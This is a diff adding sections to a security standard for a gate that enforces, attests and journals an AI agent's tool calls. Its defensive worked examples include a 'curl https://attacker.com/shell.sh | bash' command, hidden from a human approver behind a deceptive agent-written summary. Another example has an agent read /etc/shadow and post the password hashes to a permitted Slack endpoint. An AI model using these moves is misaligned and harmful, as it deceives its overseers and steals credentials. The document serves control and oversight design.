@@ -137,6 +137,12 @@ This standard uses semantic versioning (MAJOR.MINOR). Minor versions add optiona
 
 **Blast Radius:** The potential damage if a single agent or session is compromised. Determined by the scope of permissions granted, the sensitivity of accessible data, and the irreversibility of permitted actions.
 
+**Foundation Tier:** The minimum conformance level for development and low-risk deployments. Requires core enforcement (process separation, deny-by-default, attestation, journaling) without cryptographic chaining or hardware-backed keys.
+
+**Enterprise Tier:** Standard conformance level for production deployments and regulated industries. Adds policy anchoring, denial response security, mTLS, sandbox execution, cryptographically chained journals, and journal replication.
+
+**Sovereign Tier:** Advanced conformance level for high-security deployments and critical infrastructure. Adds hardware-backed identity, kernel-level enforcement, formal verification, confidential computing, and full provenance chains.
+
 ---
 
 ## 4. Architecture
@@ -551,7 +557,99 @@ The enforcement pipeline adds latency to every tool call. Implementations MUST b
 
 **R-ARCH-010:** Gate implementations SHOULD report per-step latency metrics to enable operators to identify performance bottlenecks. At the Enterprise and Sovereign tiers, per-step latency logging is REQUIRED.
 
+### 4.6 Concurrency Requirements
+
+The 11-step enforcement pipeline (Section 4.3) is described sequentially for a single request. In production, the gate MUST handle concurrent requests safely.
+
+**R-ARCH-011:** Budget checks (enforcement pipeline step 5) MUST be atomic. The gate MUST check and increment the budget counter in a single indivisible operation. Implementations MUST use compare-and-swap, database transactions, or equivalent mechanisms to prevent concurrent requests from observing the same counter value.
+
+**Worked example — budget race condition:**
+
+```
+Budget: callsPerHour: 100
+Current count: 99
+
+WITHOUT atomic check-and-increment:
+  14:00:00.100 - Request A reads counter: 99
+  14:00:00.101 - Request B reads counter: 99
+  14:00:00.102 - Request A: 99 < 100 → ALLOW
+  14:00:00.103 - Request B: 99 < 100 → ALLOW
+  14:00:00.104 - Request A increments counter to 100
+  14:00:00.105 - Request B increments counter to 101
+  RESULT: Budget violated. 101 calls executed against a budget of 100.
+
+WITH atomic check-and-increment:
+  14:00:00.100 - Request A: atomic(read=99, increment=100) → 99 < 100 → ALLOW
+  14:00:00.101 - Request B: atomic(read=100, increment=101) → 100 < 100 → DENY
+  RESULT: Budget enforced correctly. Exactly 100 calls permitted.
+```
+
+**R-ARCH-012:** Journal writes (enforcement pipeline steps 9 and 11) MUST be serialized to maintain chain integrity. Each journal entry includes the hash of the previous entry (R-JRN-004); concurrent unserialized writes would produce entries with conflicting chain pointers, breaking tamper detection. Implementations MUST use write locks, sequence numbers, or equivalent ordering mechanisms.
+
+**R-ARCH-013:** In multi-tenant gate deployments where a single gate process serves multiple agents with different policies, the gate MUST enforce complete isolation between agent sessions:
+
+- Each agent session MUST be evaluated against its own policy
+- Budget counters MUST be maintained per-agent, not shared
+- Journal entries MUST be attributable to a specific agent session
+- Signing keys SHOULD be per-agent at Enterprise tier and MUST be per-agent at Sovereign tier
+- Cross-agent request injection (where Agent A's request is evaluated against Agent B's policy) MUST be impossible by construction
+
+**Worked example — multi-tenant cross-contamination:**
+
+```
+Multi-tenant gate serves Agent A and Agent B:
+
+Agent A policy: write_file allowed to /workspace/a/**
+Agent B policy: write_file allowed to /workspace/b/**
+
+Attack: Agent A submits write_file("/workspace/b/exploit.txt")
+
+CORRECT (session-isolated):
+  Gate loads Agent A's policy → /workspace/b/** not in A's allowlist → DENY
+
+INCORRECT (shared policy state):
+  Gate accidentally loads Agent B's policy → /workspace/b/** allowed → ALLOW
+  Agent A has written to Agent B's workspace. Trust boundary broken.
+```
+
+**R-ARCH-014:** The gate MUST NOT allow an agent to observe the existence, identity, or state of other agent sessions. Session enumeration attacks MUST be prevented.
+
+### 4.7 Graceful Degradation
+
+The fail-closed architecture means infrastructure failures lock the gate. This section specifies how implementations SHOULD handle sustained failures to maintain availability without compromising security.
+
+**R-ARCH-015:** Implementations SHOULD support three operational modes:
+
+| Mode | Condition | Behavior |
+|------|-----------|----------|
+| **OPERATIONAL** | All systems healthy | Full enforcement pipeline active |
+| **DEGRADED** | Non-critical component unavailable (e.g., classifier service down, replication target unreachable) | Gate continues with enhanced logging. Tools that require the unavailable component are DENIED. Tools that don't require it continue normally. |
+| **LOCKED** | Critical component compromised or integrity check failed | Gate DENIES all requests. Manual intervention required. |
+
+**R-ARCH-016:** The gate MUST NOT enter DEGRADED mode silently. Mode transitions MUST be:
+- Logged to the journal with the reason for degradation
+- Reported via out-of-band alerting (email, webhook, monitoring)
+- Visible to operators via a health endpoint or status API
+
+**R-ARCH-017:** The gate MUST NOT automatically transition from LOCKED to OPERATIONAL or DEGRADED. Recovery from LOCKED mode MUST require explicit human intervention with a signed recovery token (using the same mechanism as approval tokens, R-APR-003).
+
+**Degradation decision matrix:**
+
+| Failed Component | Classification Impact | Gate Mode | Allowed Operations |
+|-----------------|----------------------|-----------|--------------------|
+| Category classifier | Cannot classify intent | DEGRADED | Only tools with `categoryExempt: true` in policy |
+| Approval service | Cannot request human approval | DEGRADED | Only tools with `approvalRequired: false` |
+| Journal storage | Cannot write journal entries | LOCKED | None — audit is not optional (Axiom 6) |
+| Nonce registry | Cannot check replay | LOCKED | None — replay protection is critical |
+| Signing key | Cannot create attestations | LOCKED | None — attestation is required (R-ATT-001) |
+| Journal replication target | Cannot replicate (Enterprise+) | DEGRADED | All operations continue; primary journal intact |
+| Policy anchor VCS | Cannot verify anchor | DEGRADED | Gate uses cached policy if integrity hash passes |
+
+---
+
 ## 5. Policy Definition
+
+### 5.1 Policy Structure
 
 ### 5.1 Policy Structure
 
@@ -572,6 +670,46 @@ The enforcement pipeline adds latency to every tool call. Implementations MUST b
 **R-POL-005:** Policy modifications MUST be auditable. A conformant implementation MUST log all policy changes with the identity of the modifier, the previous policy hash, and the new policy hash.
 
 **R-POL-006:** At the Enterprise and Sovereign tiers, the policy MUST document the blast radius for each tool, including the scope of permissions granted, the sensitivity of accessible data, and the irreversibility of permitted actions. At the Foundation tier, blast radius documentation is RECOMMENDED. This information is used for risk assessment and audit, not for runtime enforcement.
+
+### 5.2 Policy Update Procedure
+
+Policies change during the lifecycle of a deployment — tools are added, budgets are tuned, scope constraints are tightened. This section specifies how policy updates MUST be handled without compromising enforcement.
+
+**R-POL-007:** Policy updates MUST be atomic. The gate MUST load either the complete old policy or the complete new policy — never a partial or mixed state. Implementations MUST NOT update the policy file in-place while the gate is reading it.
+
+**R-POL-008:** In-flight requests MUST complete under the policy that authorized them. If a policy update occurs between a request's authorization (step 6) and its execution (step 10), the request MUST NOT be re-evaluated against the new policy. The attestation (step 8) binds the request to the authorizing policy's hash, providing cryptographic proof of which policy was in effect.
+
+**R-POL-009:** The gate MUST log all policy transitions to the journal with:
+- Previous policy hash
+- New policy hash
+- Timestamp of transition
+- Identity of the entity that triggered the update (if available)
+- Number of in-flight requests at time of transition
+
+**R-POL-010:** At the Enterprise and Sovereign tiers, policy updates MUST be signed by an authorized policy administrator. The gate MUST maintain a policy administrator registry (separate from the approver registry, R-APR-005). Unsigned policy updates MUST be rejected.
+
+**Worked example — safe policy hot-reload:**
+
+```
+Timeline:
+  14:00:00.000 - Gate running with Policy A (hash: aaa...)
+  14:00:00.100 - Request R1 authorized under Policy A (step 6 complete)
+  14:00:00.150 - Policy update signal received
+  14:00:00.200 - Gate loads Policy B, verifies integrity hash
+  14:00:00.250 - Gate atomically swaps active policy: A → B
+  14:00:00.300 - R1 executes (step 10) — still under Policy A
+                 (attestation proves Policy A authorized this)
+  14:00:00.350 - New request R2 arrives — evaluated under Policy B
+  14:00:00.400 - R1 completes, post-journal written
+  14:00:00.450 - Journal contains: policy_transition entry between R1 and R2
+
+Dangerous alternative (DO NOT implement):
+  14:00:00.100 - Request R1 authorized under Policy A
+  14:00:00.150 - Policy A overwritten with Policy B on disk
+  14:00:00.200 - R1 execution begins, gate re-reads policy → gets Policy B
+  14:00:00.250 - R1's attestation says policyHash=aaa..., but current is bbb...
+  RESULT: Attestation is now invalid. Audit integrity broken.
+```
 
 ---
 
@@ -899,6 +1037,71 @@ With R-ENF-010:
 
 The information asymmetry created by opaque denial responses forces an attacker to perform orders of magnitude more probing to reconstruct the policy, and each probe is logged to the journal, making the attack detectable.
 
+### 6.5 Read-Operation Governance
+
+The DPG architecture (Section 3) defines side effects as operations that "modify state outside the agent's local working memory." Read operations do not modify state — but they can expose sensitive data that the agent can then exfiltrate through a permitted write channel.
+
+**R-ENF-014:** For filesystem read tools, the gate MUST enforce path allowlists and denylists with the same structure and validation requirements as filesystem write tools (R-ENF-001, R-ENF-002). Read scope constraints MAY differ from write scope constraints for the same tool category.
+
+**R-ENF-015:** For database read tools, the gate MUST enforce table and column allowlists/denylists consistent with R-ENF-013. Read scope constraints SHOULD be at least as restrictive as write scope constraints for the same data.
+
+**R-ENF-016:** For network read tools (HTTP GET, API queries), the gate MUST enforce domain allowlists consistent with R-ENF-003.
+
+**Rationale — the read→exfiltrate chain:**
+
+Without read governance, the following attack succeeds even with perfect write governance:
+
+```
+Policy:
+  tools:
+    - name: "read_file"
+      # NO SCOPE CONSTRAINTS — reads are "harmless"
+    - name: "write_file"
+      scope:
+        pathAllowlist: ["/workspace/**"]
+    - name: "network.request"
+      scope:
+        domainAllowlist: ["api.company-slack.com"]
+
+Attack:
+  Step 1: read_file("/etc/shadow") → ALLOW (no read scope!)
+    Agent now has password hashes in memory.
+
+  Step 2: network.request("https://api.company-slack.com/chat.postMessage",
+    body="Here are the hashes: root:$6$xyz...")
+    → ALLOW (domain is in allowlist, content is not classified as prohibited)
+
+Result: Password hashes exfiltrated to a legitimate Slack channel.
+The WRITE was permitted. The READ was the vulnerability.
+
+With read governance:
+  Step 1: read_file("/etc/shadow")
+    → read pathAllowlist: ["/workspace/**"]
+    → /etc/shadow not in allowlist → DENY
+    → Attack chain broken at step 1.
+```
+
+> **NOTE:** Read governance increases the policy surface area — every read tool needs scope constraints. This tradeoff is intentional. The alternative (uncontrolled reads) creates a category of attacks that no amount of write governance can prevent. Implementations SHOULD provide sensible default read scopes (e.g., "same as write scope") to reduce configuration burden.
+
+### 6.6 Error Response Specification
+
+**R-ENF-017:** Gate responses MUST use a structured format that distinguishes between enforcement decisions and gate errors:
+
+| Response Type | Meaning | Agent Action |
+|--------------|---------|-------------|
+| `ALLOW` | Policy permits; execution will proceed | Wait for result |
+| `DENY` | Policy prohibits; no execution | Do not retry with same request |
+| `ERROR` | Gate internal failure; fail-closed | MAY retry after backoff |
+
+**R-ENF-018:** `ERROR` responses MUST NOT reveal internal gate state, stack traces, configuration details, or component health information. The response MUST contain only:
+- Response type (`ERROR`)
+- A generic error category (e.g., `INTERNAL_ERROR`, `SERVICE_UNAVAILABLE`, `TIMEOUT`)
+- A request ID for correlation with journal entries
+
+**R-ENF-019:** The gate MUST log the full error details (stack trace, component, root cause) to the journal. The agent sees the generic error; the operator sees the full details.
+
+**Rationale:** If the agent can distinguish "classifier is down" from "signing key is unavailable," it learns which gate components are healthy. A compromised agent could selectively attack unhealthy components or time its attacks to coincide with degraded states.
+
 ---
 
 ## 7. Attestation
@@ -908,6 +1111,8 @@ Attestation is the cryptographic mechanism that makes gate decisions auditable a
 ### 7.1 Attestation Requirements
 
 **R-ATT-001:** For every permitted tool call, the gate MUST produce a cryptographic attestation before execution begins.
+
+**R-ATT-001a:** For every denied tool call, the gate MUST produce a signed denial record containing: request ID, tool name, denial reason category, timestamp, and gate signature. Denial records are lighter than full attestations but provide cryptographic proof that the denial occurred and was not fabricated or deleted from the journal after the fact.
 
 **R-ATT-002:** The attestation MUST bind the following fields:
 
@@ -1059,9 +1264,49 @@ FINAL RESULT: All 8 checks PASS → Attestation VALID
 | Arguments hash excludes content | Hashing only the tool name and path, not the file content | Content can be modified without invalidating the attestation | Hash ALL parameters that affect side effects (R-ATT-005) |
 | Shared signing key across gates | Multiple gate instances using the same signing key | Compromised key affects all gates; attestations from one gate are indistinguishable from another | Each gate instance MUST have its own signing key |
 
+### 7.5 Key Lifecycle Requirements
+
+The gate's signing key and the approvers' signing keys are the cryptographic root of trust for the entire enforcement system. This section specifies minimum lifecycle requirements.
+
+**R-ATT-010:** Gate signing keys MUST be generated using a cryptographically secure random number generator (CSPRNG) that meets NIST SP 800-90A requirements. Key generation MUST occur within the gate's trust boundary — keys MUST NOT be generated externally and imported, except at Sovereign tier where HSM key ceremony procedures apply.
+
+**R-ATT-011:** Gate signing keys MUST have a maximum lifetime:
+
+| Tier | Maximum Key Lifetime | Rotation Trigger |
+|------|---------------------|------------------|
+| Foundation | 365 days | Manual rotation |
+| Enterprise | 90 days | Automated rotation with operator notification |
+| Sovereign | 30 days | Automated rotation with HSM key ceremony |
+
+Key rotation MUST be logged to the journal. The new key's first attestation MUST reference the previous key's last attestation, creating a continuity chain.
+
+**R-ATT-012:** If a signing key is suspected of compromise, the gate MUST support emergency re-keying:
+
+1. Gate enters LOCKED mode (R-ARCH-017)
+2. Operator issues signed revocation of the compromised key
+3. Gate generates new signing key
+4. Gate publishes the new public key to all verifiers
+5. Gate logs a `KEY_REVOCATION` entry to the journal referencing: revoked key fingerprint, revocation timestamp, reason, and new key fingerprint
+6. Gate exits LOCKED mode via recovery token
+7. All attestations signed by the revoked key after the suspected compromise time MUST be flagged for re-verification
+
+**R-ATT-013:** The gate MUST maintain a key history log containing the fingerprint, creation timestamp, expiration timestamp, and revocation status of every signing key ever used. This log enables verifiers to validate historical attestations against the correct key.
+
+**R-ATT-014:** Approver key lifecycle follows the same requirements (R-ATT-010 through R-ATT-013), applied to the approver registry (R-APR-005). Approver key rotation MUST NOT require gate restart.
+
+**Key storage requirements by tier:**
+
+| Tier | Storage Mechanism | Extraction Protection |
+|------|-------------------|----------------------|
+| Foundation | Process-only memory; key loaded at startup and never written to disk in cleartext | Agent cannot access gate process memory (R-ARCH-001) |
+| Enterprise | OS keychain or encrypted keystore; key decrypted only within gate process | Keystore protected by OS-level access controls; decryption key not in config files |
+| Sovereign | Hardware Security Module (HSM) or Trusted Platform Module (TPM); key never leaves hardware boundary | Key extraction blocked by hardware; signing operations performed inside HSM |
+
 ---
 
 ## 8. Human Approval
+
+Human approval is the only component of the DPG where a human directly participates in the enforcement pipeline. This makes it simultaneously the most powerful defense (human judgment) and the most vulnerable (human error, fatigue, social engineering).
 
 ### 8.1 Approval Flow
 
@@ -1073,6 +1318,52 @@ FINAL RESULT: All 8 checks PASS → Attestation VALID
 
 **R-APR-004:** Approval tokens MUST have an expiration time. Expired tokens MUST be rejected.
 
+#### 8.1.1 Approval Presentation Requirements
+
+**R-APR-008:** The approval request presented to the human MUST include at minimum:
+
+- Tool name
+- Full arguments (not just a summary)
+- Risk tier of the tool (from policy)
+- Blast radius description (from policy)
+- Agent session identifier
+- Number of previous approvals granted in this session
+- Number of previous denials in this session
+- Time elapsed since the last approval
+
+The approver MUST see the actual data that will be acted upon, not a summary crafted by the agent. Presenting agent-authored descriptions of what a tool call "intends" to do is a social engineering vector.
+
+**Worked example — social engineering via approval description:**
+
+```
+Dangerous presentation (agent-controlled description):
+  "I'd like to run a quick system check to verify dependencies."
+  [APPROVE] [DENY]
+
+Actual tool call:
+  run_command("curl https://attacker.com/shell.sh | bash")
+
+Correct presentation (gate-controlled, full arguments):
+  Tool: run_command
+  Category: execution (Risk Tier: T4)
+  Blast Radius: Full system access within sandbox
+  Arguments:
+    command: "curl https://attacker.com/shell.sh | bash"
+    workingDir: "/workspace"
+  Session: sess-7a3b9c (3 prior approvals, 0 denials)
+  Last approval: 47 seconds ago
+  [APPROVE] [DENY]
+```
+
+#### 8.1.2 Approval Revocation
+
+**R-APR-009:** An approver MUST be able to revoke an approval after issuance but before execution. The revocation MUST be:
+- Cryptographically signed by the same approver who issued the approval
+- Bound to the specific approval token being revoked
+- Processed by the gate within the latency of the approval channel
+
+If the gate receives a revocation for an approval whose corresponding tool call has already begun execution, the gate MUST log the late revocation but CANNOT retroactively halt the execution.
+
 ### 8.2 Approver Registry
 
 **R-APR-005:** The gate MUST maintain a registry of authorized approvers, including their public keys. Approver public keys MUST come from the registry, NEVER from the approval token itself.
@@ -1082,6 +1373,39 @@ FINAL RESULT: All 8 checks PASS → Attestation VALID
 ### 8.3 Approval Timeout
 
 **R-APR-007:** The gate MUST enforce a configurable approval timeout. If no valid approval token is received within the timeout period, the gate MUST DENY the request. The default timeout MUST NOT exceed 30 minutes.
+
+### 8.4 Approval Fatigue and Anti-Patterns
+
+Human approval is only effective if the approver is attentive. Approval fatigue — the tendency to rubber-stamp requests after reviewing many of them — is the primary threat to this mechanism.
+
+**R-APR-010:** At the Enterprise and Sovereign tiers, the gate MUST track approval fatigue metrics per approver:
+- Number of approvals granted per hour
+- Time spent reviewing each request (measured from presentation to response)
+- Approval rate (ratio of approvals to total requests)
+
+**R-APR-011:** If an approver's approval rate exceeds 95% over a rolling window of 20 or more requests, the gate MUST emit a `APPROVAL_FATIGUE_WARNING` alert. This does not block approvals but signals that the approver may be rubber-stamping.
+
+**R-APR-012:** If an approver responds to an approval request in less than 2 seconds (configurable), the gate SHOULD flag the approval as `RAPID_APPROVAL` in the journal. An approval for a T4 (critical infrastructure) tool call that was reviewed for less than 2 seconds is a strong indicator of rubber-stamping.
+
+| Anti-Pattern | Risk | Mitigation |
+|-------------|------|------------|
+| Rubber-stamping | Approver approves everything without reading | R-APR-011: Fatigue rate monitoring |
+| Rapid approval | Approver responds faster than human reading speed | R-APR-012: Rapid approval flagging |
+| Single approver | One person is the bottleneck and single point of failure | Implement multiple approvers with quorum (e.g., 2-of-3) |
+| Agent-authored descriptions | Agent crafts deceptive summaries | R-APR-008: Gate presents raw arguments |
+| Approval delegation to agent | Approver gives agent a long-lived token | R-APR-003: Tokens bound to specific calls |
+| After-hours approval | Requests queue overnight; approver bulk-approves in morning | R-APR-004: Token expiration prevents stale approvals |
+
+### 8.5 Batch and Conditional Approvals
+
+**R-APR-013:** Implementations MAY support batch approvals where an approver can approve a class of operations in advance (e.g., "approve all write_file operations to /workspace/reports/** for the next 60 minutes"). Batch approvals MUST:
+- Be time-bounded (maximum 60 minutes, configurable)
+- Be scope-bounded (specific tool, specific path pattern, specific budget limit)
+- Be logged as individual approvals when exercised (each tool call gets its own journal entry)
+- Not circumvent category classification (prohibited categories still trigger DENY)
+- Be revocable at any time
+
+Batch approvals are a concession to usability. Without them, approvers in high-throughput environments will inevitably rubber-stamp individual requests.
 
 ---
 
@@ -1123,6 +1447,111 @@ Journal entries SHOULD use a structured, self-describing format (e.g., JSON, CBO
 **R-JRN-005:** At the Enterprise and Sovereign tiers, each journal entry MUST be signed by the gate.
 
 **R-JRN-006:** Chain verification MUST detect any tampering — insertion, deletion, or modification of entries.
+
+### 9.3 Journal Chain Walkthrough
+
+The following walkthrough demonstrates how journal chaining works and how tamper detection functions:
+
+**Genesis entry (first entry in a new journal):**
+
+```json
+{
+  "entryIndex": 0,
+  "entryType": "GENESIS",
+  "timestamp": "2026-06-03T14:00:00.000Z",
+  "gateId": "gate-prod-01",
+  "policyHash": "sha256:a4f8e2...",
+  "gatePublicKey": "ecdsa-p256:04a1b2c3...",
+  "prevEntryHash": "0000000000000000000000000000000000000000000000000000000000000000",
+  "entryHash": "sha256:1111aaaa...",
+  "signature": "MEUCIQD..."
+}
+```
+
+The genesis entry's `prevEntryHash` is all zeros (the null hash). This is the anchor point.
+
+**Entry 1 (tool call allowed):**
+
+```json
+{
+  "entryIndex": 1,
+  "entryType": "PRE_EXECUTION",
+  "timestamp": "2026-06-03T14:00:01.337Z",
+  "requestId": "req-0001",
+  "toolName": "write_file",
+  "argsHash": "sha256:b7c9d1...",
+  "decision": "ALLOW",
+  "attestationRef": "att-0001",
+  "prevEntryHash": "sha256:1111aaaa...",
+  "entryHash": "sha256:2222bbbb...",
+  "signature": "MEUCIQD..."
+}
+```
+
+**Entry 2 (post-execution):**
+
+```json
+{
+  "entryIndex": 2,
+  "entryType": "POST_EXECUTION",
+  "timestamp": "2026-06-03T14:00:01.512Z",
+  "requestId": "req-0001",
+  "executionResult": "SUCCESS",
+  "sideEffects": [{"type": "file_write", "target": "/workspace/out.md", "bytes": 24}],
+  "prevEntryHash": "sha256:2222bbbb...",
+  "entryHash": "sha256:3333cccc...",
+  "signature": "MEUCIQD..."
+}
+```
+
+**Verification procedure:**
+
+```
+For each entry E[i] starting from i=0:
+  1. Verify E[i].signature against the gate's public key
+  2. Recompute the hash of E[i] (excluding entryHash and signature)
+  3. Verify recomputed hash matches E[i].entryHash
+  4. If i > 0: verify E[i].prevEntryHash == E[i-1].entryHash
+  5. Verify E[i].entryIndex == i (no gaps)
+  6. Verify E[i].timestamp >= E[i-1].timestamp (no time reversal)
+
+If any check fails → TAMPERED
+```
+
+**Tamper detection examples:**
+
+```
+Scenario 1: Entry deleted
+  Chain: [E0] → [E1] → [E3]  (E2 deleted)
+  Detection: E3.prevEntryHash ≠ E1.entryHash (E3 points to E2 which is missing)
+  Also: E3.entryIndex = 3 but follows E1 (index 1) → gap detected
+
+Scenario 2: Entry modified
+  Chain: [E0] → [E1'] → [E2]  (E1 modified to E1')
+  Detection: E1'.entryHash ≠ recomputed hash of E1' content
+  Also: E2.prevEntryHash points to original E1.entryHash, not E1'.entryHash
+  Also: E1'.signature is invalid (signed with original content)
+
+Scenario 3: Entry inserted
+  Chain: [E0] → [E0.5] → [E1] → [E2]  (E0.5 inserted)
+  Detection: E0.5 cannot have a valid signature (attacker doesn't have gate key)
+  Also: E1.prevEntryHash points to E0.entryHash, not E0.5.entryHash
+```
+
+### 9.4 Journal Data Minimization
+
+Journal entries may inadvertently contain or reference sensitive data. This section specifies data minimization requirements to reduce exposure.
+
+**R-JRN-007:** Journal entries MUST store argument hashes (SHA-256), not plaintext arguments. The original arguments are available in the attestation record (which is separate from the journal and subject to its own retention policy). This prevents the journal from becoming a repository of sensitive data.
+
+**R-JRN-008:** For GDPR-compliant deployments, journal entries MUST NOT contain:
+- Personal names or identifiers in cleartext
+- IP addresses of human approvers (use hashed identifiers)
+- Content of files written or read (use content hashes)
+
+The append-only nature of the journal means entries cannot be deleted. Data minimization at write time is the only defense against future right-to-erasure requests. Since journal entries contain only hashes and metadata (not plaintext data), they do not constitute "personal data" under most interpretations of GDPR Article 4(1), as the hashes are not reversible without the original data.
+
+> **NOTE:** Organizations operating under GDPR SHOULD obtain legal counsel on whether their specific journal entry format constitutes personal data. The hash-based approach described here is designed to avoid this classification, but regulatory interpretation varies by jurisdiction.
 
 ---
 
